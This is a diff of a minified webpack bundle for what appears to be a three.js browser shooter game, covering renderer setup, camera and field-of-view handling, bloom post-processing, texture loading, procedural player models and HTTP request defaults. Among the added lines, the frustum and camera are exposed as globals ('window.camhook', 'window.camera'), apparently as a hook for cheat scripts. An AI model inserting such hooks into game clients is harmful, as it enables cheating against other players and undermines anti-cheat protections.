-            this.greenScreen = t, this.scene && (t ? (this.renderer.setClearColor(65280), this.scene.fog.near = .1, this.scene.fog.far = 0) : (this.scene.fog.near = 1, this.scene.fog.far = n.fogD, this.renderer.setClearColor(n.sky)), this.scene.traverse(function(t) {
-                g.updateGreenScreen(t)
-            }))
-        }, this.renderer = new e.WebGLRenderer({
-            precision: "mediump",
-            powerPreference: "high-performance",
-            antialias: !1
-        }), this.renderer.shadowMap.enabled = !0, this.renderer.shadowMap.autoUpdate = !1, this.renderer.shadowMap.type = e.BasicShadowMap, this.renderer.setPixelRatio(window.devicePixelRatio), this.renderer.setSize(window.innerWidth, window.innerHeight), this.renderer.autoClear = !1, document.body.appendChild(this.renderer.domElement), this.updateShadowMap = function() {
-            this.renderer.shadowMap.needsUpdate = !0
-        }, window.effectComposer, this.bloomPass, this.postprocessing = {
-            enabled: !0
-        }, this.initShaders = function() {
-            var t = new e.RenderPass(this.scene, this.camera);
-            this.bloomPass = new e.UnrealBloomPass(new e.Vector2(window.innerWidth, window.innerHeight), 1.5, .4, .85), this.bloomPass.renderToScreen = !0, this.bloomPass.strength = this.postprocessing.bloomStrength, this.bloomPass.radius = this.postprocessing.bloomRadius, this.bloomPass.threshold = this.postprocessing.bloomTresh, window.effectComposer = new e.EffectComposer(this.renderer), window.effectComposer.addPass(t), window.effectComposer.addPass(this.bloomPass), this.resizeShaders()
-        }, this.resizeShaders = function() {
-            if (this.bloomPass && this.bloomPass.setSize(window.innerWidth, window.innerHeight), window.effectComposer) {
-                var t = this.renderer.getPixelRatio(),
-                    e = Math.floor(window.innerWidth / t) || 1,
-                    i = Math.floor(window.innerHeight / t) || 1;
-                window.effectComposer.setSize(e, i)
-            }
-        }, this.zoom = function(t) {
-            this.camera.fov = this.fov / t, this.camera.updateProjectionMatrix(), this.fpsCamera.fov = s.fpsFOV / t, this.fpsCamera.updateProjectionMatrix()
-        }, this.setFov = function(t) {
-            this.fov = t, this.camera.fov = t
-        }, this.setFov(s.fov), this.resize = function() {
-            this.camera.aspect = window.innerWidth / window.innerHeight, this.camera.updateProjectionMatrix(), this.fpsCamera.aspect = window.innerWidth / window.innerHeight, this.fpsCamera.updateProjectionMatrix(), this.renderer.setSize(window.innerWidth, window.innerHeight), this.resizeShaders()
-        }, this.setResMlt = function(t) {
-            this.renderer.setPixelRatio(window.devicePixelRatio * t), this.renderer.setSize(window.innerWidth, window.innerHeight)
-        }, this.updateFrustum = function() {
-            this.frustum.setFromMatrix(y.multiplyMatrices(this.camera.projectionMatrix, this.camera.matrixWorldInverse))
-        };
-        var w = 0,
-            b = 0;
-        this.shakeX = 0, this.shakeY = 0, this.updateShake = function(t) {
-            w && (w *= Math.pow(.99, t), b += r.randFloat(-Math.PI, Math.PI), this.shakeX = Math.cos(b) * w, this.shakeY = Math.sin(b) * w, .01 >= w && (w = 0, this.shakeX = this.shakeY = 0))
-        }, this.shake = function(t) {
-            w = t
-        }, this.render = function(t) {
-            this.scene && (this.postprocessing.enabled ? window.effectComposer.render() : (this.renderer.clear(), this.renderer.render(this.scene, this.camera), this.renderer.render(this.scene, this.fpsCamera)), x && (0 >= x && (x = 0, flashOverlay.style.display = "none"), x -= t), this.updateShake(t))
-        }, this.updateTexture = function(t, i) {
-            var n = m[t];
-            n ? n.image = i : (n = new e.Texture(i), m[t] = n), n.needsUpdate = !0
-        }, this.loadTexture = function(t, i, n, r) {
-            return m[i] ? m[i].mats ? m[i].mats.push(t) : (t[r || "map"] = m[i], t.needsUpdate = !0) : (m[i] = {
-                mats: [t]
-            }, n = n || {}, p.load("/textures/" + i + ".png", function(t) {
-                t.wrapS = e.RepeatWrapping, t.wrapT = e.RepeatWrapping, t.repeat.set(n.repeatX || 1, n.repeatY || 1), t.minFilter = n.tFilter || e.NearestFilter, t.magFilter = n.tFilter || e.NearestFilter, t.needsUpdate = !0;
-                for (var s = 0; s < m[i].mats.length; ++s) m[i].mats[s][r || "map"] = t, m[i].mats[s].needsUpdate = !0;
-                m[i] = t
-            })), t
-        }, this.getMat = function(t, i) {
-            var n = (i && i.texSrc || t) + (i ? (i.rotation || "x") + (i.noFog || "y") + (i.opacity || "z") + (i.color || "b") + (i.ao || "a") + (i.emissive || "e") + (i.glowText || "g") + (null == i.depthWrite ? "d" : i.depthWrite) : ""),
-                r = f[n];
-            return r || (r = new((i = i || {}).mat ? i.mat : e.MeshLambertMaterial)(i), t && "default" != t && this.loadTexture(r, i.texSrc || t, i), i && i.emissive && this.loadTexture(r, (i.glowText && i.texSrc || t) + "_e", i, "emissiveMap"), i && i.ao && (this.loadTexture(r, t + "_ao", i, "aoMap"), r.aoMapIntensity = 1.3), i && i.normal && this.loadTexture(r, t + "_n", i, "normalMap"), "default" == t && (r.vertexColors = e.VertexColors), i && i.noFog && (r.fog = !1), f[n] = r), r
-        }, this.offsetMesh = function(t, e) {
-            t.translateZ(e)
-        }, this.genColorCube = function(t, i, n, r, s) {
-            for (var a = "", c = 0; c < r.length; ++c) a += r[c] + "_";
-            var l = d[a];
-            if (!l) {
-                l = new e.Geometry;
-                var p = .5 + (s || 0);
-                for (c = 0; c < r.length;) {
-                    var h = r[c + 1],
-                        u = new e.BoxGeometry(1 * (4 == c ? .9 : 1), h, 1 * (4 == c ? .9 : 1));
-                    o.colorize(u, r[c]);
-                    var f = new e.Mesh(u);
-                    this.moveMesh(f, 0, p - h / 2, 0), this.merge(l, f), p -= h, c += 2
-                }
-                d[a] = l
-            }
-            f = new e.Mesh(l, this.getMat("default"));
-            return this.scaleMesh(f, t, i, n), f
-        };
-        var M = {};
-        this.genBody = function(t, i, n, r) {
-            var o = M[t];
-            if (!o) {
-                o = new e.Geometry;
-                var a = s.playerHeight - s.headScale - s.legHeight,
-                    c = this.genColorCube(s.chestWidth, a, s.chestScale, [t, .8, i, .2]);
-                this.moveMesh(c, 0, a / 2, 0), this.merge(o, c);
-                var l = this.genColorCube(s.headScale, s.headScale, s.headScale, [n, .2, r, .8]);
-                this.moveMesh(l, 0, s.playerHeight - s.headScale / 2 - s.legHeight, 0), this.merge(o, l), M[t] = o
-            }
-            var p = new e.Mesh(o, this.getMat("default"));
-            return p.receiveShadow = !0, p.noGreen = !0, p
-        };
-        var _ = {};
-        this.genLeg = function(t, i, n, r) {
-            var o = s.legScale,
-                a = null;
-            if (r) {
-                var c = i + "-" + (r || "");
-                if (!(a = _[c])) {
-                    var l = s.legHeight / 2,
-                        p = o / 2,
-                        h = [.5, 2],
-                        u = this.genColorCube(o, l, o, [i, 1]);
-                    this.moveMesh(u, 0, -l / 2 * Math.cos(h[1]), -l / 2 * Math.sin(h[1])), this.rotateMesh(u, 0, h[1], 0);
-                    var d = Math.sqrt(p * p + p * p - 2 * p * p * Math.cos(h[0] - h[1])),
-                        f = 2 * Math.sqrt(p * p - d / 2 * (d / 2)),
-                        m = this.genColorCube(o, d, f, [i, 1]);
-                    this.moveMesh(m, 0, -l * Math.cos(h[1]), -l * Math.sin(h[1])), this.rotateMesh(m, 0, (h[1] + h[0]) / 2, 0);
-                    var g = this.genColorCube(o, l, o, [i, .5, n, .5]);
-                    this.moveMesh(g, 0, -l * Math.cos(h[1]) - l / 2 * Math.cos(h[0]), -l * Math.sin(h[1]) - l / 2 * Math.sin(h[0])), this.rotateMesh(g, 0, h[0], 0);
-                    a = new e.Geometry;
-                    this.merge(a, u), this.merge(a, m), this.merge(a, g), _[c] = a
-                }
-                a = new e.Mesh(a, this.getMat("default")), this.moveMesh(a, s.legScale / 2 * (t ? -1 : 1), s.legHeight - s.crouchDst + .5, 0)
-            } else a = this.genColorCube(o, s.legHeight, o, [i, .75, n, .25], -.5), this.moveMesh(a, s.legScale / 2 * (t ? -1 : 1), s.legHeight, 0);
-            return a.receiveShadow = !0, a.noGreen = !0, a
-        };
-        var S = {};
-        this.genArms = function(t, i, n, r, o, a) {
-            var c = S[t.name + "-" + n + "-" + a + "-" + (o || 0)];
-            if (!c) {
-                c = new e.Geometry;
-                var l = (-s.chestWidth + s.armScale / 2 - s.armInset) * (a ? t.holdW || .4 : 1);
-                o && 1 != o || this.merge(c, this.genArm(l, s.armOff, t, !0, i, n, r, a)), o && 2 != o || this.merge(c, this.genArm(-l, s.armOff, t, !1, i, n, r, a)), S[t.name + "-" + n + "-" + a + "-" + (o || 0)] = c
-            }
-            return (c = new e.Mesh(c, this.getMat("default"))).noGreen = !0, c.receiveShadow = !0, c
-        }, this.genArm = function(t, i, n, o, a, c, l, p) {
-            var h = o ? n.leftHoldY : n.rightHoldY,
-                u = o ? n.leftHoldZ : n.rightHoldZ,
-                d = o ? n.leftHoldX || 0 : n.rightHoldX || 0,
-                f = s.armScale * (p ? .7 : 1),
-                m = Math.min(s.uArmLength + s.lArmLength - .01, r.getDistance3D(t, i, 0, (n.xOff - d) * (o && n.akimbo ? -1 : 1), n.yOff + h, n.zOff - u)),
-                g = r.getAnglesSSS(m, s.uArmLength, s.lArmLength),
-                v = Math.PI / 2;
-            if (!p) {
-                var y = this.genColorCube(f, s.uArmLength, f, [a, 1]);
-                this.moveMesh(y, 0, -s.uArmLength / 2 * Math.cos(v), -s.uArmLength / 2 * Math.sin(v)), this.rotateMesh(y, 0, v, 0);
-                var x = f / 2,
-                    w = Math.sqrt(x * x + x * x - 2 * x * x * Math.cos(Math.PI + g[0] + Math.PI / 2)),
-                    b = 2 * Math.sqrt(x * x - w / 2 * (w / 2)),
-                    M = this.genColorCube(f, w, b, [a, 1]);
-                this.moveMesh(M, 0, -s.uArmLength * Math.cos(v), -s.uArmLength * Math.sin(v)), this.rotateMesh(M, 0, (v + g[0]) / 2, 0)
-            }
-            var _ = this.genColorCube(f, s.lArmLength, f, [a, .65, c, .15, l, .2]),
-                S = s.lArmLength / 2;
-            this.moveMesh(_, 0, -s.uArmLength * Math.cos(v) - S * Math.cos(g[0]), -s.uArmLength * Math.sin(v) - S * Math.sin(g[0])), this.rotateMesh(_, 0, g[0], 0);
-            var E = new e.Geometry;
-            if (p) {
-                if (o) {
-                    var T = this.genColorCube(f, 20, f, [a, 1]);
-                    this.moveMesh(T, 0, -s.uArmLength * Math.cos(v) - -10 * Math.cos(g[0]), -s.uArmLength * Math.sin(v) - -10 * Math.sin(g[0])), this.rotateMesh(T, 0, g[0], 0), this.merge(E, T)
-                }
-            } else this.merge(E, y), this.merge(E, M);
-            return this.merge(E, _), E = new e.Mesh(E), this.moveMesh(E, t - n.xOff, i - n.yOff, -n.zOff), E.rotation.order = "YXZ", E.rotation.x = -g[1] - r.getDirection(0, i, n.zOff - u, n.yOff + h), E.rotation.y = r.getDirection(-t, 0, (o && n.akimbo ? 1 : -1) * (n.xOff - d), n.zOff - u) - Math.PI / 2, E
-        }, this.addCube = function(t, i, n, r, s, a, c, l) {
-            l = l || {};
-            var p = new e.Mesh(o.generateCube(c, r, s, a, l));
-            return this.moveMesh(p, t, i, n), p.rotation.set(l.yR || 0, l.xR || 0, l.zR || 0), p.scale.set(r, s, a), l.src && !l.noGroup ? this.meshGroup(p, l) : this.add(p, l), p
-        };
-        var E = [];
-        this.addSpray = function(t, i, n, o, a, c, p, h) {
-            tmpObj = null;
-            for (var u = 0; u < E.length; ++u)
-                if (E[u].sid == t) {
-                    tmpObj = E[u];
-                    break
-                } tmpObj || (tmpObj = new e.Mesh(l), tmpObj.sid = t, tmpObj.scale.set(s.sprayScale, s.sprayScale, 1), tmpObj.receiveShadow = !0, E.push(tmpObj), this.add(tmpObj)), this.moveMesh(tmpObj, n, o, a), tmpObj.rotation.y = r.toRad(c), tmpObj.rotation.x = r.toRad(p), tmpObj.material = this.getMat("sprays/" + i, {
-                depthWrite: !1,
-                opacity: h,
-                transparent: !0
-            })
-        }, this.clearSprays = function() {
-            for (var t = 0; t < E.length; ++t) E[t] && E[t].material.map && E[t].material.map.dispose(), this.scene.remove(E[t]);
-            E.length = 0
-        }, this.addPlane = function(t, i, n, r, s, a, c, l, p) {
-            (a = a || {}).premultipliedAlpha = !0;
-            var h = new e.Mesh(o.generatePlane(s, r, a, t, i, n));
-            return a.euler && (h.eulerOrder = a.euler), this.moveMesh(h, t, i, n), h.rotateY(c || 0), h.rotateX((l || 0) - Math.PI / 2), h.rotateZ(p || 0), h.scale.set(2 * r, 2 * s, 1), a.dontAdd ? a.src && (h.material = this.getMat(a.src, a)) : a.src && !a.noGroup ? this.meshGroup(h, a, 1) : this.add(h, a), h
-        }, this.addRamp = function(t, i, n, r, s, a, c, l, p) {
-            l = l || {};
-            var h = new e.Mesh(o.generatePlane(2 * a, r, l));
-            this.moveMesh(h, t, i + s / 2, n), a *= 2;
-            var u = Math.sqrt(s * s + a * a);
-            return h.scale.set(r, u, 2), h.rotateY(-Math.PI / 2 - c), h.rotateX(Math.asin(s / u) - Math.PI / 2), h.rotateZ(p || 0), l.src ? this.meshGroup(h, l, 1) : this.add(h, l), h
-        };
-        var T = [],
-            A = [];
-        this.loadMesh = function(t, i, n, r, s, o, a, l) {
-            var p = this.getMat(t.src, t),
-                h = T[t.src];
-            if (h) {
-                if (t.centerZ) {
-                    h.computeBoundingBox();
-                    var u = h.boundingBox.getCenter();
-                    a.translateZ(u.x * o)
-                }
-            } else h = l ? new e.Geometry : new e.BufferGeometry, T[t.src] = h, c.load("/models/" + t.src + ".obj", function(i) {
-                if (i.children[0].geometry.computeVertexNormals(), h.copy(l ? (new e.Geometry).fromBufferGeometry(i.children[0].geometry) : i.children[0].geometry), t.uv2 && h.addAttribute("uv2", new e.BufferAttribute(h.attributes.uv.array, 2)), l) {
-                    for (var n = new e.Geometry, r = 0; r < A[t.src].length; ++r) g.merge(n, A[t.src][r]);
-                    g.add(new e.Mesh(n, p), t), A[t.src].loaded = !0
-                }
-                if (t.centerZ) {
-                    h.computeBoundingBox();
-                    var s = h.boundingBox.getCenter();
-                    a.translateZ(s.x * o)
-                }
-            });
-            var d = new e.Mesh(h, p);
-            d.receiveShadow = !0, d.noGreen = t.noGreen, d.castShadow = t.shadows, d.rotation.y = s || 0, g.moveMesh(d, i, n, r), g.scaleMesh(d, o || 1, o || 1, o || 1), l ? A[t.src] ? A[t.src].loaded ? this.meshGroup(d, t) : A[t.src].push(d) : A[t.src] = [d] : a.add(d)
-        }, this.genObj3D = function(t, i, n) {
-            var r = new e.Object3D;
-            return this.moveMesh(r, t || 0, i || 0, n || 0), r
-        }, this.merge = function(t, e, i) {
-            e.updateMatrix(), t.merge(e.geometry, e.matrix, i)
-        }, this.meshGroup = function(t, i) {
-            var n = i.src + "-" + (i.shadowsR || "a") + (i.emissive || "e") + (i.opacity || "o");
-            v[n] || (v[n] = new e.Geometry, v[n].data = i), t.updateMatrix(), v[n].merge(t.geometry, t.matrix)
-        }, this.addMeshGroups = function() {
-            for (var t in v)
-                if (v.hasOwnProperty(t)) {
-                    var i = new e.Mesh((new e.BufferGeometry).fromGeometry(v[t]));
-                    i.groupSrc = v[t].data.src, i.visible = !L[i.groupSrc], i.matrixAutoUpdate = !1, this.add(i, v[t].data)
-                } v = {}
-        };
-        var L = {};
-        this.toggleMeshGroup = function(t, i) {
-            L[t] = !i, this.scene && this.scene.traverse(function(n) {
-                n instanceof e.Mesh && n.groupSrc == t && (n.visible = i)
-            })
-        }, this.add = function(t, e) {
-            e && (t.castShadow = e.shadows, t.receiveShadow = e.shadows || e.shadowsR, t.material = this.getMat(e.src, e)), this.updateGreenScreen(t), this.scene.add(t), this.updateShadowMap()
-        }, this.remove = function(t) {
-            this.scene.remove(t)
-        }, this.moveMesh = function(t, e, i, n) {
-            null != e && (t.position.x = e), null != i && (t.position.y = i), null != n && (t.position.z = n)
-        }, this.scaleMesh = function(t, e, i, n) {
-            t.scale.set(e, i, n)
-        }, this.rotateMesh = function(t, e, i, n) {
-            (e || 0 == e) && (t.rotation.y = e), (i || 0 == i) && (t.rotation.x = i), (n || 0 == n) && (t.rotation.z = n)
+    "use strict";
+    (function(e) {
+        var n = i(4),
+            r = i(65),
+            s = {
+                "Content-Type": "application/x-www-form-urlencoded"
+            };
+
+        function o(t, e) {
+            !n.isUndefined(t) && n.isUndefined(t["Content-Type"]) && (t["Content-Type"] = e)
         }
-    }, t.exports.initScene = function(t) {
-        if (n = t, t.ambient && (this.ambientLight = new s.AmbientLight(t.ambient), this.ambientLight.layers.enable(1), this.ambientLight.name = "ambLight", !this.scene.getObjectByName("ambLight") && this.scene.add(this.ambientLight)), t.light) {
-            this.skyLight = new s.DirectionalLight(t.light, 1.2), this.skyLight.name = "skyLight", this.skyLight.layers.enable(1), this.scene.getObjectByName("skyLight") || this.scene.add(this.skyLight);
-            var e = -.3 * Math.PI,
-                i = 2 * Math.PI * -.25;
-            this.skyLight.position.x = r.lightDistance * Math.cos(i), this.skyLight.position.y = r.lightDistance * Math.sin(i) * Math.sin(e), this.skyLight.position.z = r.lightDistance * Math.sin(i) * Math.cos(e), this.skyLight.castShadow = !0, this.skyLight.shadow.mapSize.width = t.shadowR || r.shadowRes, this.skyLight.shadow.mapSize.height = t.shadowR || r.shadowRes, this.skyLight.shadow.camera.far = r.shadowDst
-        }
-        this.scene.fog = new s.Fog(t.fog, 1, t.fogD), this.renderer.setClearColor(t.sky), this.useDepthMap && "0" != this.useDepthMap && this.toggleDepthMap(this.useDepthMap), this.greenScreen && this.toggleGreenscreen(this.greenScreen)
-    }
+        var a, c = {
+            adapter: ("undefined" == typeof XMLHttpRequest ? void 0 !== e && (a = i(51)) : a = i(51), a),
+            transformRequest: [function(t, e) {
+                return r(e, "Content-Type"), n.isFormData(t) || n.isArrayBuffer(t) || n.isBuffer(t) || n.isStream(t) || n.isFile(t) || n.isBlob(t) ? t : n.isArrayBufferView(t) ? t.buffer : n.isURLSearchParams(t) ? (o(e, "application/x-www-form-urlencoded;charset=utf-8"), t.toString()) : n.isObject(t) ? (o(e, "application/json;charset=utf-8"), JSON.stringify(t)) : t
+            }],
+            transformResponse: [function(t) {
+                if ("string" == typeof t) try {
+                    t = JSON.parse(t)
+                } catch (t) {}
+                return t
+            }],
+            timeout: 0,
+            xsrfCookieName: "XSRF-TOKEN",
+            xsrfHeaderName: "X-XSRF-TOKEN",
+            maxContentLength: -1,
+            validateStatus: function(t) {
+                return 200 <= t && 300 > t
+            }
+        };
+        c.headers = {
+            common: {
+                Accept: "application/json, text/plain, */*"
+            }
+        }, n.forEach(["delete", "get", "head"], function(t) {
+            c.headers[t] = {}
+        }), n.forEach(["post", "put", "patch"], function(t) {
+            c.headers[t] = n.merge(s)
+        }), t.exports = c
+    }).call(this, i(22))
 }, function(t, e) {
     t.exports = function(t) {
         return function() {
@@ -41281,6 +41028,373 @@
         }()
     }
 }, function(t, e, i) {
+    var n, r = i(1),
+        s = i(2);
+    t.exports = function(e, r, s) {
+        var o = i(24),
+            a = new e.LoadingManager,
+            c = new e.OBJLoader(a);
+        this.cubeGeo = new e.BoxGeometry(1, 1, 1), this.getCubeMesh = function() {
+            return new e.Mesh(this.cubeGeo)
+        };
+        var l = new e.PlaneGeometry(1, 1);
+        new e.CylinderGeometry(.1, 1, 1, 4, 1, !1, Math.PI / 4).computeFlatVertexNormals();
+        var p = new e.TextureLoader,
+            h = new e.MeshBasicMaterial({
+                color: 16777215
+            }),
+            u = new e.MeshBasicMaterial({
+                color: 65280
+            }),
+            d = {},
+            f = {},
+            m = {},
+            g = this,
+            v = {};
+        this.frustum = window.camhook = new e.Frustum;
+        var y = new e.Matrix4;
+        this.camera = window.camera = new e.PerspectiveCamera(0, window.innerWidth / window.innerHeight, .1, 8e3), this.fpsCamera = new e.PerspectiveCamera(s.fov, window.innerWidth / window.innerHeight, .1, 8e3), this.fpsCamera.layers.set(1), this.camera.add(this.fpsCamera), this.weaponLean = 1, this.init = function(i) {
+            this.scene = new e.Scene, t.exports.initScene.call(this, i), this.sunPlane = this.addPlane(0, 5e3, -4500, 750, 750, {
+                src: "sun_0",
+                noFog: !0,
+                transparent: !0,
+                mat: e.MeshBasicMaterial,
+                noGroup: !0
+            }, 0, r.getDirection(-4500, 5e3, 0, 0)), this.initShaders()
+        };
+        var x = 0;
+        this.flash = function(t, e) {
+            flashOverlay.style.display = "block", flashOverlay.style.left = 100 * t + "%", flashOverlay.style.top = 100 * (1 - e) + "%", x = 1
+        }, this.updateLightMap = function(t) {
+            this.skyLight && (this.skyLight.shadow.camera.right = t.shadWidth, this.skyLight.shadow.camera.left = -t.shadWidth, this.skyLight.shadow.camera.top = t.shadLength, this.skyLight.shadow.camera.bottom = -t.shadLength)
+        }, this.useDepthMap = 0, this.toggleDepthMap = function(i) {
+            if (this.useDepthMap = i, this.scene) {
+                var r = i && "0" != i;
+                this.scene.overrideMaterial = r ? h : null, r ? (this.scene.fog = new e.Fog(0, 0, i), this.renderer.setClearColor(0)) : t.exports.initScene.call(this, n)
+            }
+        }, this.greenScreen = !1, this.updateGreenScreen = function(t) {
+            g.greenScreen && !t.noGreen ? (t.realMat = t.material, t.material = u) : t.material = t.realMat || t.material
+        }, this.toggleGreenscreen = function(t) {
+            this.greenScreen = t, this.scene && (t ? (this.renderer.setClearColor(65280), this.scene.fog.near = .1, this.scene.fog.far = 0) : (this.scene.fog.near = 1, this.scene.fog.far = n.fogD, this.renderer.setClearColor(n.sky)), this.scene.traverse(function(t) {
+                g.updateGreenScreen(t)
+            }))
+        }, this.renderer = new e.WebGLRenderer({
+            precision: "mediump",
+            powerPreference: "high-performance",
+            antialias: !1
+        }), this.renderer.shadowMap.enabled = !0, this.renderer.shadowMap.autoUpdate = !1, this.renderer.shadowMap.type = e.BasicShadowMap, this.renderer.setPixelRatio(window.devicePixelRatio), this.renderer.setSize(window.innerWidth, window.innerHeight), this.renderer.autoClear = !1, document.body.appendChild(this.renderer.domElement), this.updateShadowMap = function() {
+            this.renderer.shadowMap.needsUpdate = !0
+        }, window.effectComposer, this.bloomPass, this.postprocessing = {
+            enabled: !0
+        }, this.initShaders = function() {
+            var t = new e.RenderPass(this.scene, this.camera);
+            this.bloomPass = new e.UnrealBloomPass(new e.Vector2(window.innerWidth, window.innerHeight), 1.5, .4, .85), this.bloomPass.renderToScreen = !0, this.bloomPass.strength = this.postprocessing.bloomStrength, this.bloomPass.radius = this.postprocessing.bloomRadius, this.bloomPass.threshold = this.postprocessing.bloomTresh, window.effectComposer = new e.EffectComposer(this.renderer), window.effectComposer.addPass(t), window.effectComposer.addPass(this.bloomPass), this.resizeShaders()
+        }, this.resizeShaders = function() {
+            if (this.bloomPass && this.bloomPass.setSize(window.innerWidth, window.innerHeight), window.effectComposer) {
+                var t = this.renderer.getPixelRatio(),
+                    e = Math.floor(window.innerWidth / t) || 1,
+                    i = Math.floor(window.innerHeight / t) || 1;
+                window.effectComposer.setSize(e, i)
+            }
+        }, this.zoom = function(t) {
+            this.camera.fov = this.fov / t, this.camera.updateProjectionMatrix(), this.fpsCamera.fov = this.fpsFov / t, this.fpsCamera.updateProjectionMatrix()
+        }, this.setFPSFov = function(t) {
+            this.fpsFov = t, this.fpsCamera.fov = t, this.fpsCamera.updateProjectionMatrix()
+        }, this.setFPSFov(s.fov), this.setFov = function(t) {
+            this.fov = t, this.camera.fov = t, this.camera.updateProjectionMatrix()
+        }, this.setFov(s.fov), this.resize = function() {
+            this.camera.aspect = window.innerWidth / window.innerHeight, this.camera.updateProjectionMatrix(), this.fpsCamera.aspect = window.innerWidth / window.innerHeight, this.fpsCamera.updateProjectionMatrix(), this.renderer.setSize(window.innerWidth, window.innerHeight), this.resizeShaders()
+        }, this.setResMlt = function(t) {
+            this.renderer.setPixelRatio(window.devicePixelRatio * t), this.renderer.setSize(window.innerWidth, window.innerHeight)
+        }, this.updateFrustum = function() {
+            this.frustum.setFromMatrix(y.multiplyMatrices(this.camera.projectionMatrix, this.camera.matrixWorldInverse))
+        };
+        var w = 0,
+            b = 0;
+        this.shakeX = 0, this.shakeY = 0, this.updateShake = function(t) {
+            w && (w *= Math.pow(.99, t), b += r.randFloat(-Math.PI, Math.PI), this.shakeX = Math.cos(b) * w, this.shakeY = Math.sin(b) * w, .01 >= w && (w = 0, this.shakeX = this.shakeY = 0))
+        }, this.shake = function(t) {
+            w = t
+        }, this.render = function(t) {
+            this.scene && (this.postprocessing.enabled ? window.effectComposer.render() : (this.renderer.clear(), this.renderer.render(this.scene, this.camera), this.renderer.render(this.scene, this.fpsCamera)), x && (0 >= x && (x = 0, flashOverlay.style.display = "none"), x -= t), this.updateShake(t))
+        }, this.updateTexture = function(t, i) {
+            var n = m[t];
+            n ? n.image = i : (n = new e.Texture(i), m[t] = n), n.needsUpdate = !0
+        }, this.loadTexture = function(t, i, n, r) {
+            return m[i] ? m[i].mats ? m[i].mats.push(t) : (t[r || "map"] = m[i], t.needsUpdate = !0) : (m[i] = {
+                mats: [t]
+            }, n = n || {}, p.load("/textures/" + i + ".png", function(t) {
+                t.wrapS = e.RepeatWrapping, t.wrapT = e.RepeatWrapping, t.repeat.set(n.repeatX || 1, n.repeatY || 1), t.minFilter = n.tFilter || e.NearestFilter, t.magFilter = n.tFilter || e.NearestFilter, t.needsUpdate = !0;
+                for (var s = 0; s < m[i].mats.length; ++s) m[i].mats[s][r || "map"] = t, m[i].mats[s].needsUpdate = !0;
+                m[i] = t
+            })), t
+        }, this.getMat = function(t, i) {
+            var n = (i && i.texSrc || t) + (i ? (i.rotation || "x") + (i.noFog || "y") + (i.opacity || "z") + (i.color || "b") + (i.ao || "a") + (i.emissive || "e") + (i.glowText || "g") + (null == i.depthWrite ? "d" : i.depthWrite) : ""),
+                r = f[n];
+            return r || (r = new((i = i || {}).mat ? i.mat : e.MeshLambertMaterial)(i), t && "default" != t && this.loadTexture(r, i.texSrc || t, i), i && i.emissive && this.loadTexture(r, (i.glowText && i.texSrc || t) + "_e", i, "emissiveMap"), i && i.ao && (this.loadTexture(r, t + "_ao", i, "aoMap"), r.aoMapIntensity = 1.3), i && i.normal && this.loadTexture(r, t + "_n", i, "normalMap"), "default" == t && (r.vertexColors = e.VertexColors), i && i.noFog && (r.fog = !1), f[n] = r), r
+        }, this.offsetMesh = function(t, e) {
+            t.translateZ(e)
+        }, this.genColorCube = function(t, i, n, r, s) {
+            for (var a = "", c = 0; c < r.length; ++c) a += r[c] + "_";
+            var l = d[a];
+            if (!l) {
+                l = new e.Geometry;
+                var p = .5 + (s || 0);
+                for (c = 0; c < r.length;) {
+                    var h = r[c + 1],
+                        u = new e.BoxGeometry(1 * (4 == c ? .9 : 1), h, 1 * (4 == c ? .9 : 1));
+                    o.colorize(u, r[c]);
+                    var f = new e.Mesh(u);
+                    this.moveMesh(f, 0, p - h / 2, 0), this.merge(l, f), p -= h, c += 2
+                }
+                d[a] = l
+            }
+            f = new e.Mesh(l, this.getMat("default"));
+            return this.scaleMesh(f, t, i, n), f
+        };
+        var M = {};
+        this.genBody = function(t, i, n, r) {
+            var o = M[t];
+            if (!o) {
+                o = new e.Geometry;
+                var a = s.playerHeight - s.headScale - s.legHeight,
+                    c = this.genColorCube(s.chestWidth, a, s.chestScale, [t, .8, i, .2]);
+                this.moveMesh(c, 0, a / 2, 0), this.merge(o, c);
+                var l = this.genColorCube(s.headScale, s.headScale, s.headScale, [n, .2, r, .8]);
+                this.moveMesh(l, 0, s.playerHeight - s.headScale / 2 - s.legHeight, 0), this.merge(o, l), M[t] = o
+            }
+            var p = new e.Mesh(o, this.getMat("default"));
+            return p.receiveShadow = !0, p.noGreen = !0, p
+        };
+        var _ = {};
+        this.genLeg = function(t, i, n, r) {
+            var o = s.legScale,
+                a = null;
+            if (r) {
+                var c = i + "-" + (r || "");
+                if (!(a = _[c])) {
+                    var l = s.legHeight / 2,
+                        p = o / 2,
+                        h = [.5, 2],
+                        u = this.genColorCube(o, l, o, [i, 1]);
+                    this.moveMesh(u, 0, -l / 2 * Math.cos(h[1]), -l / 2 * Math.sin(h[1])), this.rotateMesh(u, 0, h[1], 0);
+                    var d = Math.sqrt(p * p + p * p - 2 * p * p * Math.cos(h[0] - h[1])),
+                        f = 2 * Math.sqrt(p * p - d / 2 * (d / 2)),
+                        m = this.genColorCube(o, d, f, [i, 1]);
+                    this.moveMesh(m, 0, -l * Math.cos(h[1]), -l * Math.sin(h[1])), this.rotateMesh(m, 0, (h[1] + h[0]) / 2, 0);
+                    var g = this.genColorCube(o, l, o, [i, .5, n, .5]);
+                    this.moveMesh(g, 0, -l * Math.cos(h[1]) - l / 2 * Math.cos(h[0]), -l * Math.sin(h[1]) - l / 2 * Math.sin(h[0])), this.rotateMesh(g, 0, h[0], 0);
+                    a = new e.Geometry;
+                    this.merge(a, u), this.merge(a, m), this.merge(a, g), _[c] = a
+                }
+                a = new e.Mesh(a, this.getMat("default")), this.moveMesh(a, s.legScale / 2 * (t ? -1 : 1), s.legHeight - s.crouchDst + .5, 0)
+            } else a = this.genColorCube(o, s.legHeight, o, [i, .75, n, .25], -.5), this.moveMesh(a, s.legScale / 2 * (t ? -1 : 1), s.legHeight, 0);
+            return a.receiveShadow = !0, a.noGreen = !0, a
+        };
+        var S = {};
+        this.genArms = function(t, i, n, r, o, a) {
+            var c = S[t.name + "-" + n + "-" + a + "-" + (o || 0)];
+            if (!c) {
+                c = new e.Geometry;
+                var l = (-s.chestWidth + s.armScale / 2 - s.armInset) * (a ? t.holdW || .4 : 1);
+                o && 1 != o || this.merge(c, this.genArm(l, s.armOff, t, !0, i, n, r, a)), o && 2 != o || this.merge(c, this.genArm(-l, s.armOff, t, !1, i, n, r, a)), S[t.name + "-" + n + "-" + a + "-" + (o || 0)] = c
+            }
+            return (c = new e.Mesh(c, this.getMat("default"))).noGreen = !0, c.receiveShadow = !0, c
+        }, this.genArm = function(t, i, n, o, a, c, l, p) {
+            var h = o ? n.leftHoldY : n.rightHoldY,
+                u = o ? n.leftHoldZ : n.rightHoldZ,
